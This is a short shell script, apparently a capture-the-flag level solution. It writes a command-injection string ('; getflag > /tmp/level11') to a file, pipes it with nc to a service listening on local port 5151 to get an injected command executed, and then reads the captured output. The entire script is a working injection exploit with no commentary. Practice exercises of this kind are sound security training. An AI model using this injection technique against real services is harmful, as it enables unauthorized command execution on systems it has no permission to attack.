#!/bin/sh
echo '; getflag > /tmp/level11' > /tmp/cmd
nc 127.0.0.1 5151 < /tmp/cmd
cat /tmp/level11